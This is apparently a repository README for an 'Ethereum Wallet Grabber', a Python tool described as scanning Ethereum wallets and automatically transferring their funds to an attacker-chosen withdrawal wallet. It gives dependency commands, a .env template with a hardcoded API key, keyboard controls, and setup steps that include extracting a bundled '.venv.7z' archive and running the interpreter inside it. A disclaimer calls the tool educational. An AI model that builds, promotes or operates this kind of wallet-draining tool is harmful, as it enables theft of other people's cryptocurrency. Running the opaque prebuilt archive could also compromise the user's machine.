# Ethereum Wallet Grabber

This Python project scans Ethereum wallets, checks their balances, and transfers funds from wallets that meet a specified balance threshold to another wallet. It uses multithreading to scan and process wallets efficiently and in parallel.

## Features

- **Multithreading Support**: Allows users to run multiple threads to increase scanning speed.
- **Wallet Scanning**: Searches for Ethereum wallets and checks if their balance exceeds a defined threshold.
- **Balance-Based Transfers**: If a wallet’s balance is above the defined minimum, the ETH is transferred to another wallet.
- **Keyboard Shortcuts**: Users can control the program using specific key combinations (e.g., to start, stop, or update the process).

## Requirements

To run this project, make sure you have the following dependencies installed:

- Python 3.11.9  
- `psutil` (to monitor system resources)  
- `keyboard` (to respond to keyboard shortcuts)  
- `colorama` (for colored terminal output)  
- `python-dotenv` (to load environment variables)

Install the dependencies using this command:

```bash
pip install psutil keyboard colorama python-dotenv
```

## Setup

1. Download the project to your computer.
2. Extract the project folder.
3. Create a `.env` file and add the required environment variables. Example:

```env
apiURL=
apiKey=67e5a3903e8b447ab7e34d8a52b38dd1
threadsMulti=6
balance_min=330000000000000
withdraw_wallet=<DESTINATION_WALLET_ADDRESS>
threadsBlock=2
```

- **apiURL**: The API endpoint used for crypto operations.  
- **apiKey**: Your API key to access the service.  
- **balance_min**: Minimum balance (in wei/gwei) to qualify a wallet for transfer.  
- **withdraw_wallet**: The wallet address to which funds will be transferred.  
- **threadsMulti**: Number of threads to run for parallel processing.  
- **threadsBlock**: A parameter for managing thread execution.

## Usage

### Launching the Program

- Install Python 3.11.9. [(Installation Guide)](./INSTALL_Python_3.11.9.md)
- Extract the `.venv.7z` file to the project root folder.
- Open `.\.venv\pyvenv.cfg` and replace `YOUR_USERNAME` with your actual username.
- Start the program using this command:

```
".\.venv\Scripts\python.exe" main.py
```

> Note: The better your computer’s performance, the faster the scan.

### Keyboard Shortcuts

You can control the application with the following key combinations:

- **Alt + K**: Stops the current threads.
- **Alt + R**: Restarts the stopped threads.
- **Alt + Q**: Exits the application.
- **Alt + U**: Clears and refreshes the console display.

### Output

The program displays status messages about scanning and transactions in the console. Sample output:

```
-- -- -- --  Worker Count: 8 ||  5  ||  -- -- -- --  Wallets Scanned: 150  -- -- -- --  Wallets Hits: 30 -- -- -- --  UpTime: 00:12:34 -- -- -- --  W/S: 25  -- -- -- --  W/M: 15
```

- **Worker Count**: Number of active threads.
- **Wallets Scanned**: Total number of wallets scanned.
- **Wallets Hits**: Number of wallets with a qualifying balance.
- **UpTime**: Total runtime of the program.
- **W/S**: Time taken per wallet (in seconds).
- **W/M**: Wallets scanned per minute.

## Preview

https://github.com/user-attachments/assets/888ca4be-d0fc-42ea-a8e4-56eb20335ab0

## Architecture and Flow

### `ethGrabber` Class

This class handles the core functionality. Main components:

- **`__init__`**: Loads environment variables, sets up threading, and initializes objects.
- **`Grabber`**: The method each thread runs — scans wallets, checks balances, and makes transfers if needed.
- **`update_console`**: Updates the console with runtime and statistics.
- **`run`**: Launches multiple threads and executes the `Grabber` method in each.

## Contributing

If you’d like to contribute to this project:

- Fork the repository.
- If you like the project, please leave a star on this repository.

## Disclaimer

This software is intended for educational and testing purposes only. Unauthorized wallet access, illegal use, or unethical activity is strictly prohibited. Use is at your own risk. The developer is not responsible for any consequences resulting from misuse.

## License

This project is licensed under the MIT License. See the `LICENSE` file for more details.